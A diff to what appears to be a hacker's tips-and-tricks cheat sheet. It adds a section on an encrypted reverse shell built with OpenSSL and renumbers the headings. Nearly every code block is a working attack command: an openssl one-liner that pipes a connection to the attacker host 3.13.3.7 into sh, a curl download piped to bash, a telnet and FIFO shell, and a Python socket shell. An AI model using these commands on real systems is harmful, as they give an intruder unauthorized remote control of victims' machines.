@@ -52,8 +52,9 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
       2. [with cURL (encrypted)](#curlshell)
-      1. [without /dev/tcp](#reverse-shell-no-bash)
+      3. [with OpenSSL (encrypted)](#sslshell)
       1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
+      1. [without /dev/tcp](#reverse-shell-no-bash)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -1124,11 +1125,25 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3
 ```
 ```sh
 # On the target:
-curl -skfL https://1.2.3.4:8080 | bash
+curl -skfL https://3.13.3.7:8080 | bash
+```
+
+<a id="sslshell"></a>
+**5.i.d. Reverse shell with OpenSSL (encrypted)**
+
+```sh
+# Generate SSL keys:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
+# Start your listening server:
+openssl s_server -port 1524 -cert cert.pem -key key.pem
+```
+```sh
+# On the target:
+{ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
 ```
 
 <a id="reverse-shell-no-bash"></a>
-**5.i.d. Reverse shell without /dev/tcp**
+**5.i.e. Reverse shell without /dev/tcp**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -1163,7 +1178,7 @@ tail -f /tmp/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/tmp/.fio
 Note: This trick logs your commands to a file. The file will be *unlinked* from the after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.e. Reverse shell with remote.moe and ssh (encrypted)**
+**5.i.f. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1190,13 +1205,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.f. Reverse shell with Python**
+**5.i.g. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.g. Reverse shell with Perl**
+**5.i.h. Reverse shell with Perl**
 
 ```sh
 # method 1
